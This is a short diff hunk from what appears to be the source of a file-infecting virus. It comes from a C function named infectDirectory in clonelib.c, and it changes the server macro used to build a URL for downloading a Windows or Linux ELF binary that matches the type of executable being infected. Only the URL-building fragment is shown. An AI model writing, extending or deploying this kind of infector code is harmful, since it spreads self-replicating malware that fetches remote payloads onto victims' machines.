@@ -155,16 +155,16 @@ bool infectDirectory(const char* path, const char* arg0){
 						free(bytes);
 						
 					}else if(CROSS_PLATFORM_ON){
-						char* remote_url=(char*)malloc(sizeof(char)*strlen(SERVER_HOSTNAME XBIN_WIN64));
+						char* remote_url=(char*)malloc(sizeof(char)*strlen(SERVER_OSIR_HOME XBIN_WIN64));
 						if(exectype->is_win){
 							//Get windows binary
 							printf("(windows)");
-							strcpy(remote_url,SERVER_HOSTNAME XBIN_WIN64);
+							strcpy(remote_url,SERVER_OSIR_HOME XBIN_WIN64);
 							
 						}else if(exectype->is_elf){
 							//Get elf/linux binary
 							printf("(elf)");
-							strcpy(remote_url,SERVER_HOSTNAME XBIN_ELF64);
+							strcpy(remote_url,SERVER_OSIR_HOME XBIN_ELF64);
 							
 						}else{
 							printf("Error(clonelib.c) - No platform\n");
